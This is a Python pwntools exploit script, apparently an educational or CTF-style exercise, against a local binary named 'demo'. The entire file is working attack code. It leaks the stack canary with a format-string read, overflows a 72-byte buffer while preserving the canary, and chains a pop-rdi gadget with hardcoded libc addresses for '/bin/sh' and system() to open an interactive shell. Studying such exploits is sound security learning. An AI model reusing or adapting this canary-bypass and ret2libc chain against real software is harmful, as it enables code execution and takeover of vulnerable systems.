#!/usr/bin/env python3

from pwn import *

# Process information.
p = process('./demo')

# Function to leak the canary.
def canary() -> int:
    p.send(b"%15$p")                                    # Sending bytes that find stack canary.
    p.recvuntil(b"Hello! What's your name?\nHello!")    # Stripping away the extra output.

    canary = int(p.recv(19), 16)                        # Stack canary.
    log.success('Canary : %s' % hex(canary))            # Logging canary address just for debug purposes.

    return (canary)                                     # Return the value.

# Exploiting the buffer overflow and arbitrary read vulnerabilities.
def local_exploit() -> None:
    # canary() (Debugging)
    canary_offset = 72                                  # The offset of bytes to access the stack canary.
    canary_padding = b"A" * canary_offset               # Padding to access the stack canary.
    rip_padding = b"A" * 8                              # Return address padding.

    # Ret2libc (Explained further more in my ROP directory)
    pop_rdi = p64(0x401253)                             # pop rdi ; ret ROP gadget.
    bin_sh = p64(0x7ffff7f6bb62)                        # "/bin/sh" string address found in glibc.
    system = p64(0x7ffff7e29de0)                        # Address to the system(); symbol in glibc.

    # Payload construction.
    payload = canary_padding                            # Canary padding.
    payload += p64(canary())                            # Mimicked canary value.
    payload += rip_padding                              # Return address padding.
    payload += pop_rdi                                  # ROP gadgeted.
    payload += bin_sh                                   # Popping "/bin/sh" into the rdi register.
    payload += system                                   # Calling system("/bin/sh").

    # Sending the payload and praying.
    p.sendline(payload)                                 # Sending payload to the binary.
    p.interactive()                                     # Interactive interface.

local_exploit() # Executing payload

